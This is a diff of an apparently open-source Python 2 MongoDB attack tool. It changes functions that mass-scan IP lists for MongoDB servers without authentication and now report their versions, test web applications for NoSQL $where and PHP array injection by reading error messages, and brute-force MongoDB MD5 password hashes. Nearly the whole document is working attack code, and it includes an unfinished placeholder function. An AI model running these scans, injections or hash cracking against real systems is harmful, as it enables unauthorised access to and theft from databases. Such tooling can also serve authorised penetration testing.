@@ -383,12 +383,12 @@ def netAttacks(target):
 	print "Checking to see if credentials are needed..."
 	needCreds = accessCheck(target,dbPort,False)
 	
-	if needCreds == 0:
+	if needCreds[0] == 0:
 		conn = pymongo.MongoClient(target,dbPort)
 		print "Successful access with no credentials!"
 		mgtOpen = True
 	
-	elif needCreds == 1:
+	elif needCreds[0] == 1:
 		print "Login required!"
 		srvUser = raw_input("Enter server username: ")
 		srvPass = raw_input("Enter server password: ")
@@ -402,12 +402,12 @@ def netAttacks(target):
 			raw_input("Failed to authenticate.  Press enter to continue...")
 			return
 	
-	elif needCreds == 2:
+	elif needCreds[0] == 2:
 		conn = pymongo.MongoClient(target,dbPort)
 		print "Access check failure.  Testing will continue but will be unreliable."
 		mgtOpen = True
 	
-	elif needCreds == 3:
+	elif needCreds[0] == 3:
 		print "Couldn't connect to Mongo server."
 		return
 	
@@ -930,6 +930,10 @@ def getApps():
 			print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
 		else:
 			print "Test 1: PHP associative array injection"
+			
+		#Test for errors returned by injection
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()))
+		
 		injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
 		checkResult(randLength,injLen,testNum)
 		testNum += 1
@@ -941,20 +945,41 @@ def getApps():
 		else:
 			print "Test 2: $where injection (string escape)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[2]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		
+		errorCheck = str(urllib.urlopen(uriArray[2]).read())
+		
+		if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
+			if verb == "ON":
+				print "Injection returned a verbose error from the application.  Injection may be possible."
+				possAddrs.append(uriArray[2])
+			
+			else:
+				print "Possible injection."
+				possAddrs.append(uriArray[2])
+			
+		else:		
+			injLen = int(len(urllib.urlopen(uriArray[2]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
 		
 		print "\n"
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
 			print "Injecting " + uriArray[3]
 		else:
-			print "Test 3:  $where injection (integer escape)"	
+			print "Test 3:  $where injection (integer escape)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[3]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum +=1
+		errorCheck = str(urllib.urlopen(uriArray[3]).read())
+		
+		if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
+			if verb == "ON":
+				print "Injection returned a verbose error from the application.  Injection may be possible."
+				possAddrs.append(uriArray[3])
+		
+		else:
+			injLen = int(len(urllib.urlopen(uriArray[3]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum +=1
 				
 		#Start a single record attack in case the app expects only one record back
 		print "\n"		
@@ -1094,6 +1119,15 @@ def getApps():
 	raw_input("Press enter to continue...")
 	return()
 
+def errorTest (errorCheck):
+	global possAddrs
+	
+	if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
+		print "some crap"
+		
+		
+	
+
 def checkResult(baseSize,respSize,testNum):
 	global vulnAddrs
 	global possAddrs
@@ -1149,6 +1183,7 @@ def checkResult(baseSize,respSize,testNum):
 		else:
 			print "Injection failed."
 		return
+	
 	else:
 		if verb == "ON":
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
@@ -1372,43 +1407,45 @@ def accessCheck(ip,port,pingIt):
 		
 				try:
 					dbList = conn.database_names()
+					dbVer = conn.server_info()['version']
 					conn.disconnect()
-					return 0
+					return [0,dbVer]
 		
 				except:
 					if str(sys.exc_info()).find('need to login') != -1:
 						conn.disconnect()
-						return 1
+						return [1,None]
 			
 					else:
 						conn.disconnect()
-						return 2
+						return [2,None]
 
 			except:
-				return 3
+				return [3,None]
 		
 		else:
-			return 4
+			return [4,None]
 	else:
 		try:
 			conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
 		
 			try:
 				dbList = conn.database_names()
+				dbVer = conn.server_info()['version']
 				conn.disconnect()
-				return 0
+				return [0,dbVer]
 		
 			except:
 				if str(sys.exc_info()).find('need to login') != -1:
 					conn.disconnect()
-					return 1
+					return [1,None]
 			
 				else:
 					conn.disconnect()
-					return 2
+					return [2,None]
 
 		except:
-			return 3	
+			return [3,None]	
 		
 
 def massMongo():
@@ -1417,6 +1454,7 @@ def massMongo():
 	loadCheck = False
 	ping = False
 	success = []
+	versions = []
 	creds = []
 	commError = []
 	ipList = []
@@ -1471,33 +1509,35 @@ def massMongo():
 	for target in ipList:
 		result = accessCheck(target.rstrip(),27017,ping)
 			
-		if result == 0:
-			print "Successful default access on " + target.rstrip() + "."
-			success.append(target)
+		if result[0] == 0:
+			print "Successful default access on " + target.rstrip() + "(Mongo Version: " + result[1] + ")."
+			success.append(target.rstrip())
+			versions.append(result[1])
 			
-		elif result == 1:
+		elif result[0] == 1:
 			print "MongoDB running but credentials required on " + target.rstrip() + "."
-			creds.append(target)
+			creds.append(target.rstrip()) #Future use
 			
-		elif result == 2:
+		elif result[0] == 2:
 			print "Successful MongoDB connection to " + target.rstrip() + " but error executing command."
-			commError.append(target)
+			commError.append(target.rstrip()) #Future use
 		
-		elif result == 3:
+		elif result[0] == 3:
 			print "Couldn't connect to " + target.rstrip() + "."
 		
-		elif result == 4:
+		elif result[0] == 4:
 			print target.rstrip() + " didn't respond to ping."
 
 
 	print "\n\n"
 	print "Discovered MongoDB Servers with No Auth:"
+	print "IP" + "\t" + "Version"
 	
-	menuItem = 1
+	outCounter= 1
 	
 	for server in success:
-		print str(menuItem) + "-" + server
-		menuItem += 1		
+		print str(outCounter) + "-" + server + " " + versions[outCounter - 1]
+		outCounter += 1
 	
 	select = True
 	print "\n"
@@ -1507,7 +1547,7 @@ def massMongo():
 		if select == "x" or select == "X":
 			return
 	
-		elif select.isdigit() == True and int(select) <= menuItem:
+		elif select.isdigit() == True and int(select) <= outCounter:
 			victim = success[int(select) - 1]
 			optionSet[0] = True
 			raw_input("New target set! Press enter to return to the main menu.")
@@ -1594,9 +1634,9 @@ def brute_pass(user,key):
 	elif charSel == "6":
 		chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
 	count = 0
-	
+	print "\n",
 	for attempt in genBrute (chainSet,int(maxLen)):
-		print "Tested " + str(count) + " cominations."
+		print "\rCombinations tested: " + str(count) + "\r"
 		count += 1
 		if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
 			print "\nFound - " + user + ":" + attempt
